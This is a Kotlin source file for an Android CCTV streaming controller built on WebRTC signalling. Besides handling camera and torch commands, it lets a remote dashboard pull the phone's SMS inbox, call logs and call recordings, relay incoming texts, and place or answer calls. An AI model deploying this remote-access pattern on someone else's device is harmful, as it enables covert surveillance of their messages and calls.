package com.cctv.android.webrtc

import android.content.Context
import android.util.Log
import com.cctv.android.camera.CameraXManager
import org.json.JSONObject
import org.webrtc.EglBase
import org.webrtc.IceCandidate
import org.webrtc.PeerConnection

class OnDemandStreamController(
    private val context: Context,
    private val serverUrl: String,
    private val roomId: String,
    private val cameraXManager: CameraXManager,
    private val listener: StatusListener
) : SignalingClient.Listener, WebRtcManager.Listener {

    private val TAG = "OnDemandController"

    interface StatusListener {
        fun onStatusChanged(status: String, isStreaming: Boolean, activeViewers: Int)
        fun onError(message: String)
    }

    private val rootEglBase: EglBase = EglBase.create()
    private val webRtcManager = WebRtcManager(context, rootEglBase, this)
    private val signalingClient = SignalingClient(serverUrl, roomId, this)
    private val callManager = com.cctv.android.telephony.CallManager(context).apply {
        onCallStateChanged = { state, number, name ->
            signalingClient.sendCallState(state, number, name)
        }
    }

    private var activeViewerCount = 0

    fun start() {
        Log.i(TAG, "Starting CCTV streaming controller for room: $roomId")
        signalingClient.connect()
    }

    fun stop() {
        Log.i(TAG, "Stopping CCTV streaming controller")
        signalingClient.disconnect()
        webRtcManager.shutdown()
        activeViewerCount = 0
        listener.onStatusChanged("Idle", false, 0)
    }

    // --- SignalingClient.Listener ---

    override fun onConnected() {
        listener.onStatusChanged("Signaling Connected (Waiting for Viewers)", false, 0)
    }

    override fun onDisconnected() {
        listener.onStatusChanged("Signaling Disconnected", false, 0)
    }

    override fun onJoined(roomId: String, peerId: String, existingPeers: List<SignalingClient.PeerInfo>) {
        val viewers = existingPeers.filter { it.role == "viewer" }
        activeViewerCount = viewers.size
        Log.i(TAG, "Joined room $roomId. Existing viewers: $activeViewerCount")

        if (activeViewerCount > 0) {
            webRtcManager.startVideoCapturer()
            listener.onStatusChanged("LIVE STREAMING", true, activeViewerCount)
            for (viewer in viewers) {
                webRtcManager.createOfferForPeer(viewer.peerId) { sdp ->
                    signalingClient.sendOffer(sdp, viewer.peerId)
                }
            }
        } else {
            listener.onStatusChanged("Ready (On-Demand Idle)", false, 0)
        }
    }

    override fun onPeerJoined(peerId: String, role: String) {
        if (role == "viewer") {
            activeViewerCount++
            Log.i(TAG, "Viewer joined ($peerId). Active viewers: $activeViewerCount. Activating stream...")
            webRtcManager.startVideoCapturer()
            listener.onStatusChanged("LIVE STREAMING", true, activeViewerCount)

            webRtcManager.createOfferForPeer(peerId) { sdp ->
                signalingClient.sendOffer(sdp, peerId)
            }
        }
    }

    override fun onPeerLeft(peerId: String, remainingPeers: Int) {
        webRtcManager.closePeer(peerId)
        activeViewerCount = (activeViewerCount - 1).coerceAtLeast(0)
        Log.i(TAG, "Viewer left ($peerId). Remaining viewers: $activeViewerCount")

        if (activeViewerCount == 0) {
            Log.i(TAG, "All viewers left. Pausing WebRTC video capturer to conserve cellular data.")
            webRtcManager.stopVideoCapturer()
            listener.onStatusChanged("Connected (On-Demand Idle)", false, 0)
        } else {
            listener.onStatusChanged("LIVE STREAMING", true, activeViewerCount)
        }
    }

    override fun onOfferReceived(fromPeerId: String, sdp: String) {
        // Typically camera sends offer, but support remote offer if received
    }

    override fun onAnswerReceived(fromPeerId: String, sdp: String) {
        webRtcManager.handleAnswer(fromPeerId, sdp)
    }

    override fun onCandidateReceived(fromPeerId: String, candidate: String, sdpMid: String?, sdpMLineIndex: Int) {
        webRtcManager.addRemoteIceCandidate(fromPeerId, candidate, sdpMid, sdpMLineIndex)
    }

    override fun onCommandReceived(fromPeerId: String, action: String, payload: JSONObject?) {
        Log.i(TAG, "Executing remote command: $action")
        when (action) {
            "toggle_torch" -> {
                val enabled = if (payload?.has("enabled") == true) payload.optBoolean("enabled") else null
                if (enabled != null) {
                    webRtcManager.setTorch(enabled)
                } else {
                    webRtcManager.toggleTorch()
                }
            }
            "switch_camera" -> {
                webRtcManager.switchCamera()
            }
            "set_zoom" -> {
                val zoom = payload?.optDouble("zoom", 0.0)?.toFloat() ?: 0.0f
                webRtcManager.setZoom(zoom)
            }
            "show_popup_message" -> {
                val text = payload?.optString("text") ?: ""
                val durationSeconds = payload?.optInt("durationSeconds", 30) ?: 30
                val soundChime = payload?.optBoolean("soundChime", true) ?: true
                com.cctv.android.service.CctvForegroundService.messagePopupListener?.invoke(text, durationSeconds, soundChime)
            }
            "dismiss_popup_message" -> {
                com.cctv.android.service.CctvForegroundService.messageDismissListener?.invoke()
            }
            "trigger_siren" -> {
                listener.onStatusChanged("SIREN TRIGGERED", true, activeViewerCount)
            }
            "check_update" -> {
                Log.i(TAG, "Dashboard triggered OTA check_update command")
                com.cctv.android.update.AppUpdateManager(context).checkForUpdate(serverUrl)
            }
        }
    }


    override fun onGetSmsHistoryReceived(fromPeerId: String) {
        Log.i(TAG, "Dashboard requested SMS inbox history (from peer $fromPeerId)")
        val messages = com.cctv.android.sms.SmsRepository.getRecentMessages(context, 35)
        signalingClient.sendSmsHistory(messages, fromPeerId)
    }

    override fun onGetDeviceHealthReceived(fromPeerId: String) {
        Log.i(TAG, "Dashboard requested device health diagnostics (from peer $fromPeerId)")
        val healthJson = com.cctv.android.health.DeviceHealthManager.collectHealthStats(context)
        signalingClient.sendDeviceHealth(healthJson, fromPeerId)
    }

    override fun onMakeCallReceived(number: String) {
        Log.i(TAG, "Dashboard initiated call to: $number")
        callManager.placeCall(number)
    }

    override fun onEndCallReceived() {
        Log.i(TAG, "Dashboard requested end call")
        callManager.endCall()
    }

    override fun onAnswerCallReceived() {
        Log.i(TAG, "Dashboard requested answer call")
        callManager.answerCall()
    }

    override fun onToggleSpeakerphoneReceived(enabled: Boolean) {
        Log.i(TAG, "Dashboard toggled speakerphone: $enabled")
        callManager.setSpeakerphone(enabled)
    }

    override fun onGetCallLogsReceived(fromPeerId: String) {
        Log.i(TAG, "Dashboard requested call logs (from peer $fromPeerId)")
        val logs = callManager.getCallLogs(40)
        signalingClient.sendCallLogs(logs, fromPeerId)
    }

    override fun onGetRecordingsReceived(fromPeerId: String) {
        Log.i(TAG, "Dashboard requested call recordings (from peer $fromPeerId)")
        val recs = callManager.getRecordingsList()
        signalingClient.sendCallRecordings(recs, fromPeerId)
    }

    fun broadcastSms(
        address: String,
        name: String = "",
        type: String = "received",
        body: String,
        timestamp: Long
    ) {
        Log.i(TAG, "Relaying incoming SMS to connected viewers: $address (name: $name)")
        signalingClient.sendSmsReceived(address, name, type, body, timestamp)
    }

    override fun onIceConfigReceived(iceServers: List<SignalingClient.IceServerConfig>) {
        webRtcManager.updateIceServers(iceServers)
    }

    override fun onError(message: String) {
        listener.onError(message)
    }

    // --- WebRtcManager.Listener ---

    override fun onIceCandidate(candidate: IceCandidate, targetPeerId: String?) {
        signalingClient.sendCandidate(candidate.sdp, candidate.sdpMid, candidate.sdpMLineIndex, targetPeerId)
    }

    override fun onIceConnectionState(state: PeerConnection.IceConnectionState) {
        Log.i(TAG, "ICE Connection State: $state")
    }
}
